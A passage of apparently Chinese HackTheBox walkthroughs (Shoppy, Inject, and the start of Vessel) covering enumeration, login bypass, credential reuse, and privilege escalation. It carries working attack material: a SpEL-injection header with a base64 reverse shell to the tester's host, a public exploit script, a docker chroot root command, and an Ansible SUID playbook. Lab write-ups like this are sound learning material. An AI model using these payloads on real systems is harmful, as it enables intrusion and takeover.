1, Duration: 413ms] * FUZZ: admin [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 414ms] * FUZZ: images [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 417ms] * FUZZ: js [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 435ms] * FUZZ: assets [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 441ms] * FUZZ: css [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 468ms] * FUZZ: login [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 323ms] * FUZZ: Admin [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 429ms] * FUZZ: Login [Status: 301, Size: 177, Words: 7, Lines: 11, Duration: 335ms] * FUZZ: fonts [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 327ms] * FUZZ: ADMIN [Status: 301, Size: 181, Words: 7, Lines: 11, Duration: 332ms] * FUZZ: exports [Status: 200, Size: 2178, Words: 853, Lines: 57, Duration: 376ms] * FUZZ: [Status: 200, Size: 1074, Words: 152, Lines: 26, Duration: 330ms] * FUZZ: LOGIN :: Progress: [20116/20116] :: Job [1/1] :: 282 req/sec :: Duration: [0:01:06] :: Errors: 0 :: 枚举到的目录，301的页面都没东西，302的都重定向到/login目录 三、万能密码访问shoppy.htb/login 用户名输入如下，密码任意（万能密码），成功登录 admin'||'1==1 点击页面右上角搜索标签，再次输入万能密码，弹出如下Download export标签 点击Download export标签，得到两组账户，admin和josh [{ \"_id\": \"62db0e93d6d6a999a66ee67a\", \"username\": \"admin\", \"password\": \"23c6877d9e2b564ef8b32c3a23de27b2\" }, { \"_id\": \"62db0e93d6d6a999a66ee67b\", \"username\": \"josh\", \"password\": \"6ebcea65320589ca4f2f1ce039975995\" }] 破解hash：https://crackstation.net/ josh remembermethisway 用该账户登录ssh，不对 遂用wfuzz枚举子域名，发现很多301 ┌──(root💀kali)-[~/Desktop] └─# wfuzz -u http://10.129.92.247 -H \"Host: FUZZ.shoppy.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://10.129.92.247/ Total requests: 4989 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000001: 301 7 L 11 W 169 Ch \"www\" 000000020: 301 7 L 11 W 169 Ch \"www2\" 000000019: 301 7 L 11 W 169 Ch \"dev\" 000000015: 301 7 L 11 W 169 Ch \"ns\" 000000003: 301 7 L 11 W 169 Ch \"ftp\" 000000021: 301 7 L 11 W 169 Ch \"ns3\" 000000022: 301 7 L 11 W 169 Ch \"pop3\" 000000018: 301 7 L 11 W 169 Ch \"blog\" ...... 再用ffuf提速枚举子域名（wfuzz这个速度有点窒息，用ffuf或gobuster提速），并且换个大字典，过滤301响应 ┌──(root💀kali)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://10.129.92.247 -H \"Host: FUZZ.shoppy.htb\" -fc 301 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.129.92.247 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt :: Header : Host: FUZZ.shoppy.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500 :: Filter : Response status: 301 ________________________________________________ [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 318ms] * FUZZ: mattermost :: Progress: [100000/100000] :: Job [1/1] :: 100 req/sec :: Duration: [0:13:49] :: Errors: 0 :: 发现mattermost子域名，添加进本地hosts文件 echo \"10.129.92.247 mattermost.shoppy.htb\" &gt;&gt; /etc/hosts 访问mattermost.shoppy.htb 用刚刚的josh账户登录，在左侧Deploy Machine栏，聊天记录里发现jaeger账户 username: jaeger password: Sh0ppyBest@pp! ssh连上（IP有变化是因为重启了靶机环境） ┌──(root💀kali)-[~/Desktop] └─# ssh jaeger@10.129.93.16 jaeger@10.129.93.16's password: Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. jaeger@shoppy:~$ id uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger) jaeger@shoppy:~$ pwd /home/jaeger 用sudo -l查看此用户权限 jaeger@shoppy:~$ sudo -l [sudo] password for jaeger: Matching Defaults entries for jaeger on shoppy: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jaeger may run the following commands on shoppy: (deploy) /home/deploy/password-manager 发现可执行命令/home/deploy/password-manager，用如下步骤下载到本地 在ssh窗口开启http服务 jaeger@shoppy:/home/deploy$ python3 -m http.server 9898 Serving HTTP on 0.0.0.0 port 9898 (http://0.0.0.0:9898/) ... 然后在本地用如下命令下载 wget http://10.129.93.16:9898/password-manager 本地用file命令查看文件信息 ┌──(root💀kali)-[~/Desktop] └─# file password-manager password-manager: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=400b2ed9d2b4121f9991060f343348080d2905d1, for GNU/Linux 3.2.0, not stripped 是64位ELF（Executable and Linkable Format）文件 四、逆向分析用radare2工具逆向静态分析一下 参考：https://blog.csdn.net/qq_28429161/article/details/107810534 r2 password-manager 输入如下指令，定位main函数地址 &gt; aaa #自动分析并命名函数 &gt; afl #查看程序内的函数 找到main函数，然后定位到main函数的地址并查看汇编代码 &gt; s main //定位到main函数入口 &gt; pdf //查看当前函数的汇编代码 如上图，int main()和域运算符::表明这是C++程序，运行会先打印Welcome to Josh password manager! 然后打印Please enter your master password: ，并接收键盘输入，如下图 然后将键盘输入与Sample逐一字符对比 对比相同后，会打印Access granted! Here is creds !，然后调用system()函数执行cat命令，查看/home/deploy/creds.txt内容 回到靶机ssh窗口，运行如下命令，提示Please enter your master password:时，输入Sample jaeger@shoppy:/home/deploy$ sudo -u deploy ./password-manager [sudo] password for jaeger: Welcome to Josh password manager! Please enter your master password: Sample Access granted! Here is creds ! Deploy Creds : username: deploy password: Deploying@pp! 可看到已得到账户deploy的用户名密码，执行su deploy切换到deploy账户 看到deploy用户属于docker组，在如下网站搜索docker https://gtfobins.github.io/ 五、docker提权看到如下提权命令 为了让获得的shell环境更稳定，把后面的sh换成bash，执行 deploy@shoppy:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt bash 成功获取root权限 Over！ 参考https://blog.csdn.net/qq_45894840/article/details/127527914 https://0xdf.gitlab.io/2023/01/14/htb-shoppy.html","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Inject","slug":"HTB8-Inject","date":"2023-04-03T13:04:00.000Z","updated":"2023-04-07T00:48:26.849Z","comments":true,"path":"posts/89e1a3f1.html","link":"","permalink":"https://wa0er.github.io/posts/89e1a3f1.html","excerpt":"","text":"HTB-Inject一、思路概要 端口扫描发现8080页面存在上传点； 上传文件路径存在本地文件包含； 本地文件包含读取站点pom.xml文件发现Spring Cloud Function版本存在SpEL注入； SpEL注入反弹shell获取frank用户权限； frank用户目录信息泄露获取phil用户； phil用户自动任务Ansible Playbook提权获取root权限。 二、信息收集Nmap ┌──(root💀kali)-[~/Desktop] └─# nmap -p- --min-rate 10000 10.10.11.204 Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:45 EDT Nmap scan report for 10.10.11.204 Host is up (7.6s latency). Not shown: 53331 filtered ports, 12202 closed ports PORT STATE SERVICE 22/tcp open ssh 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 49.25 seconds ┌──(root💀kali)-[~/Desktop] └─# nmap -sCV -p 22,8080 10.10.11.204 Starting Nmap 7.91 ( https://nmap.org ) at 2023-04-03 02:50 EDT Nmap scan report for 10.10.11.204 Host is up (0.37s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA) | 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA) |_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds 开放端口：22（ssh）、8080（http-proxy） 访问8080端口 点击右上角Upload，存在上传点，上传php文件提示Only image files are accepted! 再次上传，同时Burp抓包，修改请求包两处filename=\"1.jpg\"、Content-Type: image/jpeg，成功上传，响应返回路径/show_image?img=1.jpg 三、LFI（本地文件包含）浏览器访问http://10.10.11.204:8080/show_image?img=1.jpg，同时抓包，修改img=../../../测试LFI（本地文件包含），可看到响应返回目录文件，确定存在LFI 文件包含：https://www.freebuf.com/articles/web/277756.html 遍历发现img=../../../../../../是根目录，img=../../../就是Web页面根目录（或img=../../../../../../var/www/WebApp） 读取pom.xml文件 &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt; &lt;parent&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt; &lt;version&gt;2.6.5&lt;/version&gt; &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt; &lt;/parent&gt; &lt;groupId&gt;com.example&lt;/groupId&gt; &lt;artifactId&gt;WebApp&lt;/artifactId&gt; &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt; &lt;name&gt;WebApp&lt;/name&gt; &lt;description&gt;Demo project for Spring Boot&lt;/description&gt; &lt;properties&gt; &lt;java.version&gt;11&lt;/java.version&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.sun.activation&lt;/groupId&gt; &lt;artifactId&gt;javax.activation&lt;/artifactId&gt; &lt;version&gt;1.2.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;bootstrap&lt;/artifactId&gt; &lt;version&gt;5.1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.webjars&lt;/groupId&gt; &lt;artifactId&gt;webjars-locator-core&lt;/artifactId&gt; &lt;/dependency&gt; &lt;/dependencies&gt; &lt;build&gt; &lt;plugins&gt; &lt;plugin&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt; &lt;version&gt;${parent.version}&lt;/version&gt; &lt;/plugin&gt; &lt;/plugins&gt; &lt;finalName&gt;spring-webapp&lt;/finalName&gt; &lt;/build&gt; &lt;/project&gt; 四、CVE-2022-22963（Spring Cloud Function SpEL注入）关键代码如下，版本3.2.2，存在Spring Cloud Function SpEL 代码注入（CVE-2022-22963） 分析：https://www.anquanke.com/post/id/280278 利用：https://blog.csdn.net/qq_44842234/article/details/125845459 &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt; &lt;version&gt;3.2.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; 利用方法1 在如下网站填写反弹shell命令，得到base64处理后的命令 https://bewhale.github.io/tools/encode.html 先本地执行nc -lvnp 9898开启nc监听 浏览器访问http://10.10.11.204:8080/functionRouter，同时Burp抓包，Send to Repeater之后在Reapeter右键选择Change request method，此时GET请求变成POST请求，然后添加如下请求头，发包 spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi45Lzk4OTggMD4mMQ==}|{base64,-d}|{bash,-i}\") 成功反弹shell，获取frank用户权限 利用方法2 下载利用脚本到本地 利用脚本：https://github.com/chaosec2021/EXP-POC/tree/main/Spring-cloud-function-SpEL-RCE 先本地执行nc -lvnp 9898开启nc监听 本地执行如下命令 python3 Spel_RCE_Bash_EXP.py http://10.10.11.204:8080 10.10.16.9 9898 成功反弹shell，获取frank用户权限 用如下find命令查看frank属组的文件，且过滤掉带有proc字符串的行（因为/proc目录下太多无用的相关文件） frank@inject:/$ find / -group frank -type f 2&gt;/dev/null | grep -v \"proc\" find / -group frank -type f 2&gt;/dev/null | grep -v \"proc\" /tmp/XvFlf /tmp/CmMlc /tmp/JYiHo.b64 /tmp/hsperfdata_frank/824 /tmp/YGqfV.b64 /tmp/KpLRF.b64 /tmp/gotRCEbutCANTrevSHELL.aaaaaa /tmp/CkFZS /tmp/shell.sh /home/frank/.bashrc /home/frank/.m2/settings.xml /home/frank/.cache/motd.legal-displayed /home/frank/.profile 在/home/frank/.m2/settings.xml看到phil账户 frank@inject:/$ cat /home/frank/.m2/settings.xml cat /home/frank/.m2/settings.xml &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;settings xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt; &lt;servers&gt; &lt;server&gt; &lt;id&gt;Inject&lt;/id&gt; &lt;username&gt;phil&lt;/username&gt; &lt;password&gt;DocPhillovestoInject123&lt;/password&gt; &lt;privateKey&gt;${user.home}/.ssh/id_dsa&lt;/privateKey&gt; &lt;filePermissions&gt;660&lt;/filePermissions&gt; &lt;directoryPermissions&gt;660&lt;/directoryPermissions&gt; &lt;configuration&gt;&lt;/configuration&gt; &lt;/server&gt; &lt;/servers&gt; &lt;/settings&gt; phil DocPhillovestoInject123 执行su phil切换到phil账户（输入密码回车之后就是phil用户了） frank@inject:/$ su phil su phil Password: DocPhillovestoInject123 id uid=1001(phil) gid=1001(phil) groups=1001(phil),50(staff) pwd / 下载linpeas.sh到本地：https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS 本地开启http服务 python3 -m http.server 80 phil用户窗口执行wget http://10.10.16.9/linpeas.sh，从本地传输linpeas.sh到靶机 添加可执行权限 chmod 777 linpeas.sh 五、Ansible Playbook提权执行./linpeas.sh，看到如图自动任务playbook_1.yml 查看文件内容 ls -la /opt/automation/tasks/playbook_1.yml -rw-r--r-- 1 root root 150 Apr 3 11:36 /opt/automation/tasks/playbook_1.yml cat /opt/automation/tasks/playbook_1.yml - hosts: localhost tasks: - name: Checking webapp service ansible.builtin.systemd: name: webapp enabled: yes state: started google搜索，是ansible playbook，由于靶机shell环境编辑文件不方便，本地编辑getshell.yml，内容如下 - hosts: localhost tasks: - name: getshell command: chmod u+s /bin/bash become: true 回到靶机，执行如下命令，将文件从本地传输到靶机/opt/automation/tasks/目录下（记得本地开http服务） cd /opt/automation/tasks/ wget http://10.10.16.9/getshell.yml 稍等片刻，自动任务执行后，查看/bin/bash已设置suid，执行bash -p，成功获取root权限 Over！ 参考https://blog.csdn.net/qq_58869808/article/details/129505388 https://www.0le.cn/archives/55.html","categories":[{"name":"靶机","slug":"靶机","permalink":"https://wa0er.github.io/categories/%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://wa0er.github.io/tags/HackTheBox/"}],"author":"wa0er"},{"title":"HTB-Vessel","slug":"HTB7-Vessel","date":"2023-03-29T02:50:00.000Z","updated":"2023-03-29T03:04:33.228Z","comments":true,"path":"posts/7c3ddaa9.html","link":"","permalink":"https://wa0er.github.io/posts/7c3ddaa9.html","excerpt":"","text":"HTB-Vessel一、思路概要 信息收集发现Git信息泄露； 分析Git信息发现Nodejs-SQL注入； Nodejs-SQL注入以admin身份登录主站； 主站源码发现openwebanalytics子域； Google发现OpenWebAnalytics存在CVE-2022-24637； CVE-2022-24637以admin身份登录openwebanalytics子域并获取www-data用户shell； /home/steven发现可疑加密PDF文件和密码生成程序； Python反编译密码生成程序破解PDF密码获取SSH用户密码； 登录SSH用户查询拥有suid权限的文件发现CVE-2022-0811； CVE-2022-0811内核提权获取root用户权限。 二、信息收集nmap扫端口 ┌──(root💀kali)-[~/Desktop] └─# nmap -sC -sV 10.10.11.178 Starting Nmap 7.91 ( https://nmap.org ) at 2023-03-20 21:58 EDT Nmap scan report for 10.10.11.178 Host is up (0.78s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 38:c2:97:32:7b:9e:c5:65:b4:4b:4e:a3:30:a5:9a:a5 (RSA) | 256 33:b3:55:f4:a1:7f:f8:4e:48:da:c5:29:63:13:83:3d (ECDSA) |_ 256 a1:f1:88:1c:3a:39:72:74:e6:30:1f:28:b6:80:25:4e (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Vessel |_http-trane-info: Problem with XML parsing of /evox/about Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 32.56 seconds 开放端口：22（ssh）、80（http） 浏览器访问IP，页面如下 ffuf枚举子目录 ┌──(root💀kali)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -t 100 -mc 200,301 -u http://10.10.11.178/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.178/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,301 ________________________________________________ [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 576ms] * FUZZ: dev [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 4584ms] * FUZZ: css [Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 525ms] * FUZZ: 404 [Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 288ms] * FUZZ: login [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 884ms] * FUZZ: js [Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 2728ms] * FUZZ: register [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 2683ms] * FUZZ: img [Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 302ms] * FUZZ: 500 [Status: 200, Size: 15030, Words: 5599, Lines: 244, Duration: 301ms] * FUZZ: [Status: 200, Size: 3637, Words: 1604, Lines: 64, Duration: 374ms] * FUZZ: reset [Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 362ms] * FUZZ: 401 :: Progress: [26584/26584] :: Job [1/1] :: 293 req/sec :: Duration: [0:01:40] :: Errors: 2 :: 301：/dev、/css、/js、/img 200：/404、/login、/register、/500、/reset、/401 以上目录，只有/dev最可能存在线索，因为其他几个都是比较常规的功能点。但对/dev目录做枚举，没发现什么东西，就猜一下.git，但/dev/.git做了跳转，会跳转到404，就进一层对/dev/.git/的子目录做枚举 ┌──(root💀kali)-[~/Desktop] └─# ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -t 100 -mc 200,301 -u http://10.10.11.178/dev/.git/FUZZ /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.0.0-dev ________________________________________________ :: Method : GET :: URL : http://10.10.11.178/dev/.git/FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 100 :: Matcher : Response status: 200,301 ________________________________________________ [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 280ms] * FUZZ: info [Status: 200, Size: 2607, Words: 18, Lines: 19, Duration: 4971ms] * FUZZ: index [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 6035ms] * FUZZ: logs [Status: 301, Size: 199, Words: 7, Lines: 11, Duration: 6166ms] * FUZZ: objects [Status: 301, Size: 195, Words: 7, Lines: 11, Duration: 379ms] * FUZZ: hooks [Status: 200, Size: 139, Words: 13, Lines: 9, Duration: 7085ms] * FUZZ: config [Status: 200, Size: 73, Words: 10, Lines: 2, Duration: 281ms] * FUZZ: description [Status: 301, Size: 201, Words: 7, Lines: 11, Duration: 262ms] * FUZZ: branches [Status: 301, Size: 193, Words: 7, Lines: 11, Duration: 279ms] * FUZZ: refs :: Progress: [63087/63087] :: Job [1/1] :: 322 req/sec :: Duration: [0:02:58] :: Errors: 0 :: 确定存在Git信息泄露 三、Git信息泄露Git信息泄露参考：https://www.freebuf.com/articles/web/318599.html 用git-dumper工具把git相关文件下载到本地（也可以用GitHack），此处下载到./Vessel/git目录下 pip install git-dumper git-dumper http://10.10.11.178/dev ./Vessel/git git log看一下git日志，看到邮箱ethan@vessel.htb ┌──(root💀kali)-[~/Desktop] └─# cd Vessel/git ┌──(root💀kali)-[~/Desktop/Vessel/git] └─# git log commit 208167e785aae5b052a4a2f9843d74e733fbd917 (HEAD -&gt; master) Author: Ethan &lt;ethan@vessel.htb&gt; Date: Mon Aug 22 10:11:34 2022 -0400 Potential security fixes commit edb18f3e0cd9ee39769ff3951eeb799dd1d8517e Author: Ethan &lt;ethan@vessel.htb&gt; Date: Fri Aug 12 14:19:19 2022 -0400 Security Fixes commit f1369cfecb4a3125ec4060f1a725ce4aa6cbecd3 Author: Ethan &lt;ethan@vessel.htb&gt; Date: Wed Aug 10 15:16:56 2022 -0400 Initial commit 用tree命令看一下文件目录树（也可用GitKraken或其他审计类工具分析git文件） ┌──(root💀kali)-[~/Desktop] └─# tree -a Vessel/git/ Vessel/git/ ├── config │&nbsp;&nbsp; └── db.js ├── .git │&nbsp;&nbsp; ├── COMMIT_EDITMSG │&nbsp;&nbsp; ├── config │&nbsp;&nbsp; ├── description │&nbsp;&nbsp; ├── HEAD │&nbsp;&nbsp; ├── hooks │&nbsp;&nbsp; │&nbsp;&nbsp; ├── applypatch-msg.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── commit-msg.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── post-update.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-applypatch.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-commit.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── prepare-commit-msg.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-push.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-rebase.sample │&nbsp;&nbsp; │&nbsp;&nbsp; ├── pre-receive.sample │&nbsp;&nbsp; │&nbsp;&nbsp; └── update.sample │&nbsp;&nbsp; ├── index │&nbsp;&nbsp; ├── info │&nbsp;&nbsp; │&nbsp;&nbsp; └── exclude │&nbsp;&nbsp; ├── logs │&nbsp;&nbsp; │&nbsp;&nbsp; ├── HEAD │&nbsp;&nbsp; │&nbsp;&nbsp; └── refs │&nbsp;&nbsp; │&nbsp;&nbsp; └── heads │&nbsp;&nbsp; │&nbsp;&nbsp; └── master │&nbsp;&nbsp; ├── objects │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 00 │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── 459be15fd7f38a86843ba1ce5cd6eabeb50a59 │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 0a │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── ddd8d9ac7f6daf0d44ee78925d07de0a3dee44 │&nbsp;&nbsp; │&nbsp;&nbsp; ├── ...... │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── ...... │&nbsp;&nbsp; │&nbsp;&nbsp; └── fc │&nbsp;&nbsp; │&nbsp;&nbsp; └── 5ce922a9d1073d6c9cc34770c140cc3488f3fa │&nbsp;&nbsp; ├── ORIG_HEAD │&nbsp;&nbsp; └── refs │&nbsp;&nbsp; └── heads │&nbsp;&nbsp; └── master ├── index.js ├── public │&nbsp;&nbsp; ├── css │&nbsp;&nbsp; │&nbsp;&nbsp; ├── style.css │&nbsp;&nbsp; │&nbsp;&nbsp; └── styles.css │&nbsp;&nbsp; ├── img │&nbsp;&nbsp; │&nbsp;&nbsp; ├── bg-masthead.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; ├── error-404-monochrome.svg │&nbsp;&nbsp; │&nbsp;&nbsp; ├── favicon.ico │&nbsp;&nbsp; │&nbsp;&nbsp; ├── portfolio │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── thumbnails │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 1.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 2.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 3.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 4.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 5.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; ├── 6.jpg │&nbsp;&nbsp; │&nbsp;&nbsp; │&nbsp;&nbsp; └── images.zip │&nbsp;&nbsp; │&nbsp;&nbsp; └── profile.jpg │&nbsp;&nbsp; └── js │&nbsp;&nbsp; ├── script.js │&nbsp;&nbsp; └── scripts.js ├── routes │&nbsp;&nbsp; └── index.js └── views ├── 401.ejs ├── 404.ejs ├── 500.ejs ├── index.ejs ├── login.ejs ├── register.ejs └── reset.ejs 在./Vessel/git/config/db.js 看到数据库连接信息 ┌──(root💀kali)-[~/Desktop] └─# cat ./Vessel/git/config/db.js var mysql = require('mysql'); var connection = { db: { host : 'localhost', user : 'default', password : 'daqvACHKvRn84VdVp', database : 'vessel' }}; module.exports = connection; 在./Vessel/git/routes/index.js看到登录页面的数据库查询语句 cat ./Vessel/git/routes/index.js router.post('/api/login', function(req, res) { let username = req.body.username; let password = req.body.password; if (username &amp;&amp; password) { connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) { if (error) throw error; if (results.length &gt; 0) { req.session.loggedin = true; req.session.username = username; req.flash('success', 'Succesfully logged in!'); res.redirect('/admin'); } else { req.flash('error', 'Wrong credentials! Try 